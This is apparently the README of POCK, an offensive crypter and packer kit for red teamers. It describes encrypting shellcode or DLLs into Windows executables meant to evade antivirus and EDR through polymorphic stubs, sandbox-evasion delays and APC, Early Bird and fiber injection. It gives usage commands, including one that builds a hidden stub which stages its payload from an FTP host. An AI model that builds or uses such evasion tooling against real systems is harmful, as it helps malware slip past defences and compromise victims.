# POCK - Polymorphic Obfuscation and Crypter Kit

**“UnPACKable payloads start here!”**  
A customizable binary packer designed for red teamers, malware researchers, and offensive security professionals.

---

## Overview

POCK (Polymorphic Obfuscation and Crypter Kit) is a modular crypter and packer framework that encrypts and embeds raw payloads into stealthy Windows executables. It is built to help offensive operators evade endpoint detection and response (EDR) and antivirus solutions by implementing polymorphic stubs, anti-sandbox logic, and multiple injection methods.

POCK supports:

- Payload types: raw shellcode (`.bin`) or reflective DLLs (`.dll`)
- Multiple encryption options: AES or XOR
- Staging payloads externally via FTP or embedding them directly
- Injection techniques such as:
  - Asynchronous Procedure Call (APC)
  - Early Bird APC
  - Fiber-based execution
- Anti-analysis features: entropy delay, Fibonacci and factorial loops, sleep timer
- Stub polymorphism via Jinja2-based template randomization
- Hidden compilation for stealth or console mode for debugging

---

## Features

- AES and XOR encryption support
- Jinja2-powered polymorphic stub generation
- Built-in anti-analysis and sandbox evasion logic
- Supports both embedded and staged payloads
- Multiple code injection options
- Configurable execution delays
- Generates fully native Windows executables using `mingw-w64`

---

## Requirements

- Python 3.8 or higher
- [pycryptodome](https://pypi.org/project/pycryptodome/)
- [jinja2](https://pypi.org/project/Jinja2/)
- MinGW-w64 cross-compiler (e.g. `x86_64-w64-mingw32-gcc`)

### Install Python dependencies:

```bash
pip install -r requirements.txt
```
Usage:
```bash
python3 POCK.py -i <input_file> -o <output_file> -e <encryption> -k <key> -t <payload_type> [options]
```
##Required Arguments
-i, --input
##Path to raw shellcode (.bin) or DLL (.dll) file

-o, --output
##Name of the compiled output executable

-e, --encryption
##Encryption method to use: aes or xor

-k, --key
##Key to encrypt the payload

-t, --type
##Payload type: shellcode or dll

###Optional Arguments
--inject <method>
##Injection method: apc, earlybird, fiber

--url <ftp_url>
##FTP URL for remote payload staging

--ftp-user <username>
##FTP username for authentication

--ftp-pass <password>
##FTP password for authentication

--entropy
##Add entropy-based execution delay

--fibonacci
##Add Fibonacci loop delay

--factorial
##Add factorial computation delay

--sleep <seconds>
##Sleep for specified seconds before executing

--hide
##Compile stub as a hidden (GUI) executable instead of console

##Example Commands
```bash
Generating an embedded payload
python3 POCK.py -i payload.bin -o packed.exe -e aes -k <AES Key> -t shellcode --inject apc --entropy --fibonacci --sleep 15 --hide

Generating a staged stub
python3 POCK.py -i beacon.dll -o agent.exe -e xor -k RedTeamFTW -t dll --url ftp://192.168.50.219/payload.bin --ftp-user user --ftp-pass pass --inject fiber --hide
```
